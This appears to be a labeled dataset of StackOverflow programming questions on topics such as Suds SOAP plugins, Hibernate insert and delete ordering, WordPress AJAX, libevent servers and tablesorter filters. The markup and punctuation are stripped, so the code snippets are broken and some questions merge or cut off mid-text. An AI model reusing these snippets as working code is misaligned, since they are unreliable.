For example the following MetaSubGBaseInformation elements are simple elements and Suds does not generate anything for them in the SOAPXML.p  pre classlangxml prettyprintoverridecodeltxselement nameCMTS typexsstring minOccurs0gt     ltxsannotationgt         ltxsdocumentationgt             ltdDisplayName firstVersion5.0 lastVersion7.4gtCMTSltdDisplayNamegt             ltdValidFromgt5.0ltdValidFromgt             ltdValidTogt7.4ltdValidTogt             ltdType firstVersion5.0 lastVersion7.4gtStringltdTypegt             ltdBaseAccess firstVersion5.0 lastVersion7.4gtRWRWRWltdBaseAccessgt             ltdMandatory firstVersion5.0 lastVersion7.4gtNoltdMandatorygt             ltdMaxLength firstVersion5.0 lastVersion7.4gt1024ltdMaxLengthgt         ltxsdocumentationgt     ltxsannotationgt ltxselementgt  ltxselement nameTAGLocation typexsstring minOccurs0gt     ltxsannotationgt         ltxsdocumentationgt             ltdDisplayNamegtPreferred location of Trunk GatewayltdDisplayNamegt             ltdTypegtStringltdTypegt             ltdBaseAccessgtRWRWRWltdBaseAccessgt             ltdMandatorygtNoltdMandatorygt             ltdDefaultValuegtNoneltdDefaultValuegt             ltdMaxLengthgt1024ltdMaxLengthgt         ltxsdocumentationgt     ltxsannotationgt ltxselementgt codepre  pIn contrast the following MetaSubGBaseInformation element is a complex element, and even when it is optional and my code does not assign a value to it, it ends up in the generated SOAPXML.p  pre classlangxml prettyprintoverridecodeltxselement nameProviderStatus typetMetaSubGBaseInformationProviderStatus minOccurs0gt     ltxsannotationgt         ltxsdocumentationgt             ltdDisplayNamegtProvider statusltdDisplayNamegt             ltdTypegtChoice of valuesltdTypegt             ltdBaseAccessgtRRRltdBaseAccessgt             ltdMandatorygtNoltdMandatorygt             ltdValuesgt                 ltdValuegtUnavailableltdValuegt                 ltdValuegtAvailableltdValuegt                 ltdValuegtInactiveltdValuegt                 ltdValuegtActiveltdValuegt                 ltdValuegtOut of serviceltdValuegt                 ltdValuegtQuiescingltdValuegt                 ltdValuegtUnconfiguredltdValuegt                 ltdValuegtPending availableltdValuegt             ltdValuesgt         ltxsdocumentationgt     ltxsannotationgt ltxselementgt codepre  pSuds generates the following for ProviderStatus which as stated above upsets my server.p  pre classlangxml prettyprintoverridecodeltProviderStatusgt codepre  pThe workaround is to set all codeMetaSubGBaseInformationcode elements to codeNonecode after creating the parent element, and before assigning values, as in the following. This is superfluous for the simple elements, but does ensure that nonassigned complex elements do not result in generated SOAPXML.p  precodesubGatewayBaseInformation  client.factory.createns1MetaSubGBaseInformation for el in subGatewayBaseInformation   subGatewayBaseInformation.setitemel[0], None subGatewayBaseInformation.Action             apply subGatewayBaseInformation.NetworkElementName  Meribel etc... codepre  pThis results in Suds generating SOAPXML without empty elements, which is acceptable to my server.p  pBut does anyone know of a cleaner way to achieve the same effectp  pstrongSolution below is based on answers  comments from both dusan and Roland Smith below.strongp  pThis solution uses a Suds MessagePlugin to prune empty XML of the form codeltSubscriberTypegtcode before Suds puts the request on the wire. We only need to prune on ShUpdates where we are updating data on the server, and the logic especially the indexing down into the children to get the service indication element list is very specific to the WSDL. It would not work for different WSDL.p  precodeclass MyPluginMessagePlugin   def marshalledself, context     pruned  []     req  context.envelope.children[1].children[0]     if req.name  ShUpdate       si  req.children[2].children[0].children[0].children[2].children[0].children[0]       for el in si.children         if re.matchlt[azAZ09]gt, Element.plainel           pruned.appendel       for p in pruned         si.children.removep codepre  pAnd then we just need to reference the plugin when we create the client.p  precodeclient  Clienturl, plugins[MyPlugin] codepre
Negative 1652 pI would like to implement an in memory cache of some type in my user space linux application.p  pwhat im after is essentially the same behavior as linuxs filesystem buffer cache  whatever memory isnt used by anything else, is used by my processes that are caching. p  pif i were to write this with a hard coded limit on how large my cache should be,  I must essentially limit my cache to some predefined value, instead of it growing if the rest of the processes arent using as much memory, or it shrinking, if memory usage balloons. p  pwhat i would like, is linux to call some kind of callback that notifies me to drop some entries from my cache, when it actually needs memory. p  pthat way, whatever memory is needed by the processes can be taken away from my cache, and whatever is left of memory is dedicated to my cache. p  pis there a way to do this in linuxp  pis the best method of doing this just monitoring procmeminfo and increasing my cache size such that the used physical memory is barely less than total physical memoryp

Negative 1652 pI have been trying to figure out the best practices to write testfriendly code, but more specifically the practices related to object construction. In the blue book we discovered that we should enforce invariants when creating objects to avoid the corruption of our entities, value objects, etc. with this thought in mind, Design By Contract seems like the solution to avoid the corruption of our objects, but when we follow this, we could end up writing code like thisp  precodeclass Car     Constructor    public CarDoor door, Engine engine, Wheel wheel           Contract.Requiresdoor.IsNotNullDoor is required       Contract.Requiresengine.IsNotNullEngine is required       Contract.Requireswheel.IsNotNullWheel is required       ....        ...    public void StartEngine           this.engine.Start      codepre  pWell this looks good at first sight right It seems we are building a safe class exposing the contract required so every time a codeCarcode object is created we can know for sure that the object is valid.p  pNow lets see this example from a testingdriven point of view. p  pI want to build testfriendly code but in order to be able to test in isolation my codeCarcode object I need to create either a mock a stub or a dummy object for each dependency just to create my object, even when perhaps I just want to test a method that only uses one of these dependencies like the codeStartEnginecode method. Following Misko Hevery philosophy of testing Id like to write my test specifying explicitly that I do not care about the Door or Wheel objects just passing null reference to the constructor, but since I am checking for nulls, I just cant do itp  pThis is just a small piece of code but when you are facing a real application writing tests becomes harder and harder because you have to resolve dependencies for your subjectp  pMisko proposes that we should not abuse of nullchecks in the code which contradicts Design By Contract because of doing it, writing tests becomes a pain, as an alternative he sais its better to write more tests than have just the ilussion that our code is safe just because we have nullchecks everywherep  pWhat are your thoughts on this How would you do it  What should be the best practicep

Negative 1652 pIve been recently playing with implementing AJAX into WordPress. I know there is many plugins available but I wanted to make it on my own.p  pIn articles regarding to AJAXified WordPress most people recommend using emadminajax.phpem to process AJAX requests. My first idea how to make it was to simply create custom getheader and getfooterp  h21st wayh2  precode Boolean function ajaxtrue function isajax     ifREQUEST[ajax]      return true    else      return false      function ajaxgetheader     ifisajax      getheaderajax       Insert headerajax.php which     includes only google analytics tracking code and some minor stuff      return true    else      getheader        Standard header     return true       Function ajaxgetfooter pretty much the same  codepre  pThen, page templates would look likep  precodeltphp ajaxgetheader gt  lt Content gt  ltphp ajaxgetfooter gt codepre  pAnd making ajax calls the standard way, of course. This method looks for me simple and clean. On the other hand, many people recommend using builtin function, by creating a hook to catch AJAX calls.p  h22nd wayh2  precodefunction processajax    Show the page or whatever   addactionwpajaxnoprivajax, processajax addactionwpajaxajax, processajax codepre  pAnd pointing AJAX calls to adminajax.phpp  h2Which one to useh2  pI have tried both these methods and discovered that the first way is loading remarkably faster then the latter one. In same conditions the 1st way ajaxgetheader took approximately 400ms to load a page almost no content and the 2nd way adminajax.php about 800ms. I dont know why, both ways load WP core and do thing almost the same.p  pSo, I am asking you, is there a serious reason to make AJAX calls through adminajax.php Is it nessesary And why it takes more time to process a call through the recommended wayp

Negative 1652 pAs the topic says I have created a chess game as my first 2D game, but when ever I try to create a runnable jar file from it I get a strange behavior, and when I move the pieces the game becomes chaotic and nothing works. The weird thing is that inside the eclipse everything works perfectly.  When it creates the runnable jar file eclipse gives the following error p  precodeResource is out of sync with the file system ChessProjectsrc.DSStore. codepre  pI dont remember even having such file in my project so I guess it is a hidden file or a System file. Then I tried to export it  as a normal Jar file with eclipse and after it through terminal By the way I am a mac OSX lion user ,but I failed at both ways and got codeNullPointerExceptioncode and some more errors. I have read a little about manifest files and tried to compile my code by myself and then export in each of the ways which I mentioned above.p  pI have tried to solve it for a week or so and asked in various forums for help, but with no luck. p  pThanks to francis I have realized the problem might come from my code itself.

Negative 1652 pemDisclaimer The author of the question has an average knowledge of Erlang and a basic but increasing knowledge of C.emp  pI am using the codereadcode function to read the bytes which my codeport.ccode program gets from the Erlang port example provided in the a hrefhttpwww.erlang.orgdoctutorialusersguide.html relnofollowInteroperability Tutorial User Guidea it is also described in Chapter 12 of the Erlang Programming book.p  pBut I tend to think that the question is not Erlangrelated at all, because the wrong values that I get e.g. 231 instead of 999 come from the C side.p  pThe problem is that this protocol does not work with parameters which are more than 255 otherwise it works nice.

Negative 1652 pi have one question according to asynchronous server management. I am using stronglibevent2strong and for my own learning experience plain ANSI C. I do my stresstests with ab from the apache2 utils. Mostly coden 10000code and codec 400code.  My database is a sql server on a debian computer in my local network. So the connection is pretty fast. I profile my app also with valgrind codeleakcheckfull showreachableyescodep  pI have one issue now. When I do synchronous calls to the sql database than everything works fine. But it is all done on the main thread, so it takes some time for new clients to receive data while the stress is running.  When I do asynchronous calls to the sql database than everything works fine as well, as long as no client disconnects BEFORE the sql call returns. As soon as the sql call returns and the client is disconnected already, i get a lot of invalid read erros of course because its buffer is freed already, the socket is closed etc. I tried a lot of different things already but couldnt get a proper solution.p  pI just wanted to ask in general how you handle stuff like this Do you keep a BST for example, which includes all the clients connected and when an async call returns you search for it in it If it is still in there u execute the callback otherwise discard it I think this could kill performance quite a bit. I also tried to check if the socket is still open, but it was kinda weird.  coderecvfd, buffer, 1, MSGPEEKcode always codereturned 1code on opened and closed nonblocking sockets.. p  pWell, it is kinda hard to explain what i did already so i just wait for what you guys will answer p  pGreetings Markusp  pupdate i just had the crazy idea to use a mutex for each connection. When i enter the async call i lock it, and release it after it returns..  but i dont trust this method.. it doesnt sound right.. can anyone recommend that approach p  pupdate 2 I tried my idea and it works great. It was a bit tricky to get it right but the locking did itp

Negative 1652 pThere seems to be a common agreement in the blogosphere, that one of the great features of the Entity Framework 4 is the ability to create generic repositories on top of the generic ObjectSets. Example implementations of generic repositories are basically wrappers around an ObjectSet, that simply translate method calls. There is no meaningful logic going on. After some thinking I have come to the point where I was asking myself What benefits does a generic repository give me, that the ObjectSet itself doesnt already provide The ObjectSet has all the required functionality CRUD. Since it implements IEnumerable and even IQueryable it offers all the Linq extensions that make it very easy to specify exactly what data you want. What exactly justifies going the detour via some IRepository, as opposed to simply using the IObjectSet directly as my interface for the data access layerp  pThanks and regards,p  pPeter.p

Negative 1652 pIn one of my projects, the current implementation of a log system uses a mysql table. The applications released to customers write some log information to the table on a daily basis. There is a script on our server to automatically remove all logs that are more than 60 days old. The problem is that the primary id keeps growing and some time in the future, it will outgrow the limit. The id currently is set to int autoincrement. So whats the best solution for this problem. I am no expert in database and your help is highly appreciated. I tried to search on Stackoverflow but could not find answer for my case.p  pShould I change int to bigint How do I do that without interrupting the dbs normal operation I want to avoid any down time.

Negative 1652 pIm facing a very serious issue with my implementation of the Spark list in a Flex mobile application deployed on iOS and Android.

The codeListcodes codeitemmouseDownHandlercode does get fired and in fact behaves identical for selections that do get committed properly and those that doesnt. The difference I found so far is that the codecommitPropertiescode method belongs to codeListBasecode is never called for nonsuccessful selections, therefore, the codeListcodes codecommitSelectioncode isnt called either, resulting in the fact that the selection wont change.p  pDoes anyone have a deeper insight into why this doesnt work Id be more than thankful for any help as I dont see me figuring this out myself.p  pFor anyone who wants to reproduce the issue, set up a Flex mobile project and add a list to view with a simply inline renderer and some generic objects, much like the followingp  p                    p  precodeltsList idmyList width100 height100gt     ltsdataProvidergt         ltsArrayCollectiongt             ltfxObject labelItem1 gt                          .....             ltfxObject labelItem30 gt         ltsArrayCollectiongt     ltsdataProvidergt ltsListgt codepre  pp  pThen randomly select the items with your finger on a device and see what happens, items are not selected even though you touched the screen, sometimes the down color shows up.p  pEdit Oh and dont get fixated on the 3 outta 4, youve gotta try a little more often than just 4 times to see the issue, but roughly 75 is a good estimate I guess.p  pEdit2 Since other are obviously experiencing the same issue, I filed a bug report in the Flex Jira a hrefhttpsissues.apache.orgjirabrowseFLEX33169 relnofollowhttpsissues.apache.orgjirabrowseFLEX33169ap

Negative 1652 pI have a very strange problem. I load my app, switch to the correct tab and then press the button I need to press. This runs a function and when I first load the page it may only provide part of the correct result. However if I wait a few seconds it produces the correct result in full. Any ideas why this might be happeningp  pstrongAdditional Informationstrongp  pThe button simply checks through a list of objects returned via ScriptDB. Objects that are valid are displayed and objects that are invalid are not. If the object appears again in updates the text to display how many have been found in the list eg the label would change from Object A to Object A 2.p  pIt seems to me like it doesnt have the rest of the list somehow as it doesnt always stop at the same object.  Its Very strange and not something Ive experienced before. The other features of my app using ScriptDB work completely regardless of how quickly I use them.p

Negative 1652 pI have a custom component with one RadioGroup that has two RadioButton, ids codeidradioButton1code and codeidradioButton2code. On the other hand, there is a TabActivity with five tabs. On each tab, this component is used more than one time.p  pHeres the problem, when orientation changes and the activity is recreated, all of the RadioButton is loaded with the same attrs, this includes codeandroidtextcode, codeandroidmargincode and even the styled attrs that ive created. It also happens with all the CheckBox that has the same ids. p  pI spent some time trying to discover why this was happening and concluded that android is doing that in onRestoreInstanceState. If I comment the line that calls the super method it works fine. p  precodeOverride protected void onRestoreInstanceStateBundle savedInstanceState       super.onRestoreInstanceStatesavedInstanceState   codepre  pIs this how its supposed to be Or what could one do to cause thisp  pIm guessing that its not a normal behaviour because when a custom view is created, it inflates the same layout with the same views that has the same ids. So its not possible to instantiate a new custom view generating different ids for its child every time. Using the code above or codeandroidconfigChangescode on the manifest seems to be a bad workaround to me. So, any help is appreciated.p
Negative 1652 pIm working on an addon where most of the contentuser interface is hosted in a tab that I open up with the tabs API.

Negative 1652 pIve been tasked with creating a dynamic report builder to extend our current product that should allow our users to configure with relative ease a useful report drawing data from what theyve inputted into the system. Currently we customize these reports manually, and this process involves a developer me taking the requirements of the report fields, aggregate totals, percentages, etc and publishing the results as a relatively interactive page that allows for the ability to drill down for more information in the record rows, etc. p  pThe reports are not extremely complicated, but theyre involved enough that programmatically generating these reports doesnt seem possible. I feel like creating an interface to allow the users to customize the look of the report shouldnt be too difficult, though involved in and of itself. Where I am at a loss is how to create an interface that will allow users who have absolutely no programming literacy the ability to easily generate the SQL queries that will pull the information they need. p  pIn fact, they need to be able to create these queries and access the bowels of their inputted data without ever being aware of what theyre really doing. I feel for this to work as required, the generation of the report has to be as indistinguishable from magic as possible. The user should be able to drag and drop what heshe needs from sets of possible data and magically produce an report.p  pIm up for the challenge of course, but I really dont know where to start. Once I get the gears moving, resolving individual issues will be easy  well actually more like part of the process, but getting off the ground has been challenging and frustrating. If anyone can offer me a direction to search in, Im not afraid of putting in the hours. Thank you for your time, and I look forward to some positive suggestions. p

Negative 1652 pI have an issue in my multitiered application where I have detached my objects from the Session.  I have a user edit via the GUI the properties of a parent object along with adding, editing, and removal of child objects collection within the parent.  I am cascading all including orphaned deletes between the parent object and its children.p  pUpon associating the objects with a Session saveOrUpdate etc. the inserts and deletes are occurring but the order in which it occurs violates a unique constraint of the business natural key of the child object if the user of the GUI deletes and then adds back in the same business key.p  pAfter consulting the book Hibernate in Action and also the online reference pages  I still could not seem to find a definitive answer to the problem of unique constraints being violated when an item has been removed and then added back into a collection of children of a parent object. p  pHibernate never issues the deletes before the inserts as per the lines from Hibernate documentation as belowp  pThe documentation states the following ordering on a call to flush p  ol liall entity insertions in the same order as the Save was called on them li liall entity updates li liall collection deletions li liall collection element deletions, updates and insertions li liall collection insertions li liall entity deletions in the same order as the delete was called. li ol  pImplies the order as being deletions, updates and insertions or is the documentation not strictly specifying an order here p  pHibernate appears not to match this order as inserts are occurring before deletes for my collection elements.  If Hibernate always issues the inserts first then what is the recommended solution to this problem  Do we have to step out of the Hibernate world and handle this relationship ourselves p  pIf so, then fine, but I really do not want to have to code around this if there is a  solution available in Hibernate. p  pIf I have a table with a surrogate primary key for the  AND a unique constraint  on another columns can I get Hibernate to honour the unique constraint when it calls flush by tweaking attributes in the mapping file p  pFrom the online reference documentation  Hibernate however doesnt have enough information to correctly arrange SQL INSERT and UPDATE statements to avoid constraint violations, and needs some p  phelp to handle bidirectional associations properly. Making one side of the association inverse tells Hibernate to basically ignore it, to consider it a mirror of the other side. Thats all that is necessary for Hibernate to work out all of the issues when transformation a directional navigation model to a SQL database schema. p

Negative 1652 pWhat im trying to do is implement a SIP client which listens for SIP messages.Ok so i have run the SIP client on a server code192.168.0.246code and the SIP server is running on code192.168.2.40code.Now have a look at the below screen shot.p  pimg srchttpi.stack.imgur.comzTenN.png altenter image description herep  pIts a trace file of the server running the client code on code192.168.0.246code.

The JSON object would come from server.p  pOn client side I use ajax and sometimes I determine insertion based on other idattributes on the page as to whether I appendprependreplace or ignoreplacing to the target element. p  pstrongWhat options do I have to use the same view for ViewModels or JSON objectsstrongp  pI had considered, on compile, render a File.Js version of the view. Include that as a resource on the page and perform replaces on the codevar ViewHtmlTemplate  ltdivgtModel.Messageltdivgtcode. I would have to be very disciplined in moving all formattingifstatement logic to the viewmodel which would also be JSON serialized.p  pOr, that the view has a script tag to bind the ViewModel serilized to a js var and then run a function on document ready.p  pThe 3rd option is instead of returning a JSON object, to return an array of serverside already htmlrendered views. p

Maybe its just me, but I think defining these anonymously clutters my code and obscures the logic behind the activity. However, since Im really only using these listeners in this class, it seems like a waste to move them to their own separate file, as it will eat away the namespace of my package. p  pIm wondering what the best practice is for a situation like this. Is there a well defined rule regarding listeners or is it just up to the preference of the developer Im trying to conform this project as close to best coding practices as I can, since Im new to writing Android applications, so hopefully I can learn something from this.

Next step check if the points of this row is lower than the current persons points and if yes, grab next layer  row, if not, return previous layer row.p  pIn the persons table there are 9 columns with 2 bigints, 4 varchars 150, 1 date and 2 booleans.p  pOf course I would prefer to get the exact row rank, but from what I tested, this is slow and takes at least several seconds, with my wat it can be done in a few hundreds of a second.p  pAlso, the way I suggested is not precise when there are several layers with the same points, but it doesnt need to be that precise, so we can neglect that fact.p  pExtra info, I program in PHP, so if there is a specific solution for this in PHP  MySQL it would be nice too.p  pAt last, its worth to mention that the table grows with 20k rows an hour almost 500k a day.p  pThanks for reading this and I appreciate all the help.

Negative 1652 pI am using the Maven PMD plugin as a part of the Maven Site Plugin to generate a PMD report.

The problem is that it doesnt align correctly on some browsers, as shown in the above image. My understanding was that in contrast to codevisibilty hiddencode, an element with codedisplay nonecode should not affect the position of any other element and should render as if its not therep  pThe browsers where it doesnt render correctly are Google strongChromestrong and strongSafaristrong  but only on strongMacOSstrong and strongIE7strong I know, I know... on Windows.

Basically, the element style of codedisplay nonecode on the codeltimggtcode element overrides the codeinlinecode from the code.menu imgcode rule. Removing that, then toggling between codeblockcode and codeinlinecode allows you to reproduce the issue.

Negative 1652 pI have a fairly complex AIR project which is compiling a lot of movieclips together using timelinemax and finally outputting the whole thing as an .flv using a hrefhttpsgithub.comzeropointnineleelibtreemastersrcleelibutilflvEncoder relnofollowhttpsgithub.comzeropointnineleelibtreemastersrcleelibutilflvEncoderap  pI am getting corruption of the flv when certain videos are added to the timeline all videos are embedded in movieclips in an external .swc.

But the two movieclips containing these videos are never on the stage at the same time, they are added one by one when their part of the main timeline is reached, and removed afterwards.  This works in all other cases, and the corruption does not happen with certain videos.

Negative 1652 pIm trying to set up a web page where users can select an .rdl file to run, and it will open a Report Viewer control ASPX, load the report definition file, run it, and display the report.p  pSo far, what Ive found is, local reports can only accept data sources from code so you have to execute the database code manually, which would be a pain since the datasource can vary widely between reports, and remote reports require an SSRS server, something I am unable to set up.p  pWhat puzzles me is, Report Builder 3 is able to run .rdl files with embedded Data Sources in them, so why cant the Report Viewer control Is there some way I can make the Report Viewer control act like Report Builder 3 and just have it run .rdl filesp

Negative 1652 pIm creating a backend application with SQLAlchemy using the declarative base. The ORM requires about 15 tables each of which maps to a class object in SQLAlchemy. Because these class objects are all defined identically I thought a factory pattern could produce the classes more concisely. However, these classes not only have to be defined, they have to be assigned to unique variable names so they can be imported and used through the project.p  pSorry if this question is a bit long, I updated it as I better understood the problem.p  pBecause we have so many columns 1000 we define their names and types in external text files to keep things readable. Having done that one way to go about declaring our models is like thisp  precodeclass Foo1Base     tablename  foo1  class Foo2Base     tablename  foo2  ... etc codepre  pand then I can add the columns by looping over the contents of the external text file and using the codesetattrcode on each class definition. p  pThis is OK but it feels too repetitive as we have about 15 tables. So instead I took a stab at writing a factory function that could define the classes dynamically.  p  precodedef ormfactoryclassname     class NewClassBase         tablename  classname.lower     NewClass.name  classname.upper     return NewClass codepre  pAgain I can just loop over the columns and use codesetattrcode. When I put it together it looks like thisp  precodefor classname in classnamelist     ORMClass  ormfactoryclassname     headerkeywordlist  getheaderkeywordlistclassname     definecolumnsORMClass, headerkeywordlist codepre  pWhere codegetheaderkeywordlistcode gets the column information and codedefinecolumnscode performs the codesetattrcode assignment. When I use this and run codeBase.metadata.createallcode the SQL schema get generated just fine.p  pBut, when I then try to import these class definitions into another model I get an error like thisp  precodeSAWarning The classname NewClass is already in the registry of this declarative base, mapped to ltclass qldatabaseinterface.IRFLT0gt codepre  pThis, I now realize makes total sense based on what I learned yesterday a hrefhttpstackoverflow.comquestions18326719pythonclassvariablenamevsnamePython class variable name vs namea. p  pYou can address this by using codetypecode as a class generator in your factory function as two of the answers below do. However, this does not solve the issue of being able to import the class because the while the classes are dynamically constructed in the factory function the variable the output of that function is assigned to is static.

For example strong5th string  1th fret  C4 261.63Hzstrong is equals to strong6th string  5th fret  C4 261.63Hzstrong. p  pThe chances of having an user playing a note in the wrong string and getting it right is low, but I think it would be really good to know the string so I can provide to the users some error feedback when they play the wrong string Like you should go a string up or down.p  pDo you know what can I do to detect the string Thanks in advance  p  pstrong[edit]strongp  pThe guitar and strings that we are using affect the timbre so analyzing the timbre seems to not be a easy way of detecting stringsp  pemVariations in timbre on your guitar are produced by an enormous number of factors from pickup design and position, the natural resonances and damping in your guitar due to the wood used thats a different sort of timber and its construction and shape, the gauge and age of your strings, your playing technique, where you fret and pluck the string, and so on.emp

Negative 1652 pIs there a way with tablesorter to use a dropdown filter external to the table when using ajax that filters based on criteria not related to a column in the tablep  pFor instance, if the table is a list of accounts, id like to be able to filter on expired accounts even if that is not one of the columns in the table. Each of the columns in the table will also have their own standard tablesorter filters.p  pSince Im using ajax and serverside filtering, even the column filters are just used to send a codeREQUESTcode to the ajax url and not filtering what is showing in the table. So Id like to be able to send such a codeREQUESTcode without having to associate codefilterformattercode with a specific column. p  pI realize I can do this by adding a dummy column, use codefilterformattercode, and bind the external dropdown through a change function similar to the example shown at a hrefhttpjsfiddle.netMottieabkNM11 relnofollowthis examplea, but I was hoping there was a simpler way.

Negative 1652 pI have a web app that were still stuck in asp.net 2.5 with.  Weve started using some newer technology with our front end, including loading some of our data into JSON objects and passing them around the application using localStorage.  Its working really great.p  pIn the future were going to change our ASP.NET web form architecture into ah HTML5JQuery front and Web API back end.  So were trying to write for that future while still being constrained to our old web form post backs and business objects.  So right now were posting from our search form to our search result page web form and well be calling a method from our business object to grab and return search results.p  pThe criteria object we pass in has 20 or so values and a couple of collections product line IDs, category IDs, etc...  So its a slightly complicated object.  In the old form we grabbed values from the controls, validated them, and passed them in using the asp.net controls, it was a single form solution.  Our new solution has a search form and a results page.  Were passing our values from form to form in a JSON object in internal storage.  I cant really get to that from server side so I also stashed the values in a hidden field on the form that I can grab on the server side when I POST to the results page eventually well call an API from the new form using ajax.   So now that I can see the data, how do I parse and work with a JSON object in the code behind of asp.net.  I need to load the 20 or so search criteria values and iterate through the ID collections Guid and int to load them into the same criteria object.  This object is then passed in as the search methods parameter and search results will come back.  Not sure how to manipulate the json on the server side.p

Negative 1652 pI need to synchronize tables between 2 databases daily, the source is MSSQL 2008, the target is MSSQL 2005. If I use UPDATE, INSERT, and DELETE statements i.e. UPDATE rows that changed, INSERT new rows, DELETE rows no longer present, will there be performance improvements if I perform the DELETE statement first i.e. so that the UPDATE statement doesnt look at rows that dont need to be updated, because they will be deleted.p  pHere are some other things I need to consider. The tables have 13 million rows, and because of the amount of transactions and business requirements, the source DB needs to remain online, and the query needs to be as efficient as possible. The job will be run daily in a SQL server agent job on the target DB. On top of that, I am a DB rookiep  pThanks StackOverflow community, you are awesomep

Negative 1652 pBasically what I want is a CSS Triangle that is vertically aligned in the center of my content, positioned at the right of my content with a slight padding without using explicit measurements based on the triangles codeborderwidthcode.p  pThe wrapper should expand to contain the CSS Triangle if the triangle is huge like in this example and the CSS Triangle should always be vertically aligned in the middle of the wrapper.  If there is a large amount of text, the CSS Triangle should just overlap the text if they cross.p  pThis seems perfectly reasonable, but I ran into some problems check out this a hrefhttpjsfiddle.netQuwEc2 relnofollowstrongJsFiddlestronga for where Im at now.p  pIf I assign a codeminheightcode, I can get to code1.code below.  The problem with code1.code is that I have to choose an arbitrary height.  Moreover, if content grows, it wont be perfectly vertically centered because of the codetop 25code which doesnt truly put it in the middle.  To allow multiple different sizes of arrows easily, I really dont want to assign a minheight or any height for that matter, I just want it to calculate its size on its own.p  pI also had to use an codeoverflow hiddencode to prevent the scrollbar from appearing because doing a coderight 45pxcode will push the right side of the CSS Triangle box, so I cant use an codeoverflow visiblecode anywhere too.p  pIf I remove the fixed height, then I end up with code2.codep  pIs this possible to do without using an explicit height and other explicit measurements how would you go about correctly vertically aligning it If you have ideas using jQuery to grab widths and so forth, thats fine too  Ive tagged it.p  pimg srchttpi.stack.imgur.comr3hVZ.jpg altCSS Triangle Imagep

Negative 1652 pPlease help to choose a solution nodeJS  socket.io  redis for a chat room timer.p  pMultiple Rooms are created, every room has exactly one HOST i.e admin for that room, every room will have 500 members in it. There can be n rooms at any time t. A room will be destroyed after 1 hour of creation.p  pNode server  Process rooms member related data from redis and broadcast it in every room after some interval. this interval i.e When to broadcast is decided by an array, call it as codetimerArrayForRoom1code. This array holds the time in seconds when to broadcast data. This array is different for every room.p  pNow, two approaches  p  ol lipUsing setInterval in nodeJS so that it will call its broadcasting method after some time interval. Every room will have its separate interval object.pli lipGive codetimerArrayForRoom1code to the HOST of the room and let the host fire an event after some seconds as per the timer array. i.e using setinterval on client side. And node server will take its action on that event.pli ol  pFirst approach is HOST independent but it involves use of setInterval in NodeJS.p  pWhich one would be better to implement so that server will be able to support 1000 rooms having 500 members in it running and broadcasting all at a time p  pWhich is more reliable as I read setInterval does not guarantee its time to call the functionp  pOr any other approachp  pHostadmin will be different device and exactly one for every room, so second approach will balance the server load to some extent.p

Negative 1652 pI am trying to access a 3rd party c dll using JNA. I have look ed at the JNA documentation available and some blog for understanding JNA. p  pBut now I am stuck with a problem. Actually the dll which I have has multiple classes in it. And the functions are defined inside the classes. So there is a hierarchy. How can I access the functions then p  pFor example I have a dll named abc.dll. In this dll I have class pqrs and in that class there is a function called xyz. i want to access xyz function. p  pTill now I am able to load abc.dll successfully as followingp  precodeabc abcDLL  abc Native.loadLibraryabc, abc.class codepre  pI have created a interface like thisp  precodepublic interface abc extends Library      void xyz   this is wrong because xyz is not directly abc.dll but inside the class pqrs which is inside abc.dll  codepre  pAnd like this there are multiple classes inside the dll. I have  searched google a lot about this. But could not find a solution.

Negative 1652 pIm working with codeUILocalNotificationcode and I would like to notify one of my controller that the notification has been received even if the app has been terminated.p  pIn my appDelegate I implemented this functionp  precodevoidapplicationUIApplication application didReceiveLocalNotificationUILocalNotification notification      if [application applicationState]  UIApplicationStateInactive          [[NSNotificationCenter defaultCenter] postNotificationNamelocalNotificationReceived objectnotification.userInfo]       codepre  pIn my codeUIViewControllercode I implemented the observer on the codeviewDidLoadcode methodp  precode voidviewDidLoad      [super viewDidLoad]      [[NSNotificationCenter defaultCenter] addObserverself selectorselectordidlocalNotificationReceived namelocalNotificationReceived objectnil]      codepre  pIt works perfectly when the app run in background. Since the codeviewDidLoadcode method has already been called and the Observer is waiting..p  pThe issue is when I kill the app. Then the observer of my controller is gone and the codedidlocalNotificationReceivedcode method is never called.p  pI think that its because when I receive the codelocalNotificationcode and run the app again. The codedidReceiveLocalNotificationcode method is called before the codeviewDidLoadcode of my codeUIViewControllercode. Then the observer is created after the codePostNotificationNamecode then the observer receives nothing.p  pI would like to know if there is some best practices or pattern to handle this kind of issue.p  pI know that the codedidFinishLaunchingWithOptionscode method is called before codedidlocalNotificationReceivedcode so there is probably something to do there.p  pUPDATE p  pI also discovered that when is app is terminated. Once you tap the notification, It opens the app, call the function codedidFinishLaunchingWithOptionscode but never call codedidReceiveLocalNotificationcode. So I think that Im gonna handle both cases differently.p

Negative 1652 pI am trying to cluster 2 computers together with PacemakerCorosync.  The only resource that they share is an ocfheartbeatIPaddr this is the main problemp  pSince there are only two nodes failover will only occur if the codenoquorumpolicyignorecode.p  pWhen the network cable is pulled from node A, corosync on node A binds to 127.0.0.1 and pacemaker believes that node A is still online and the node B is the one offline.p  pPacemaker attempts to start the IPaddr on Node A but it fails to start because there is no network connection.  Node B on the other hand recognizes that node B is offline and if the IPaddr service was started on node A it will start it on itself node B successfully.p  pHowever, since the service failed to start on node A it enters a fatal state and has to be rebooted to rejoin the cluster. you could restart some of the needed services instead.p  p1 workaround is the set codestartfailureisfatalfalsecode which makes node A continue to try to start the IPaddr service until it is successful. the problem with this is that once it is successful  you have a ip conflict between the two nodes until they re cluster and one of the gives up the resource.p  pI am playing around with the idea of having a node attribute that mirrors codecat sysclassneteth0carriercode which is 1 when the cable is connected and zero when it is disconnected and then having a location rule that says if connected  zero dont start service kind of thing, but well see.p  pAny thoughts or ideas would be greatly appreciated.p

Google is working fine, and Yahoo was working fine for a few months as well until a few days ago.p  pFor some reason, using my local version of IE 11, after authenticating with Yahoo, two responses are sent back to the web server, and each is validated in its own separate thread. One response is determined to be valid, and the other response is determined to be invalid because the first response is already validated. The responses are then sent back to the user, and depending on which one is sent first, two very different outcomes can occur.p  pUsing Chrome and Firefox works correctly. Yahoo is returning only one response. Using different versions of IE on other machines including 11 work correctly as well. Using fiddler, Ive verified that the correct requests are being sent out. Ive tried clearing my cache, disabling any addons, and changing document and browser modes using the dev tools, and no luck. Is there anything that can be causing two responses to be sent backp  pThe basic code to send the request is below. The config file is using all default values.p  precodeOpenIdRelyingParty openid  new OpenIdRelyingParty IAuthenticationRequest request  openid.CreateRequestIdentifier.Parsehttpsme.yahoo.com  var fields  new ClaimsRequest fields.Email  DemandLevel.Require  request.AddExtensionfields  return request.RedirectingResponse.AsActionResult codepre

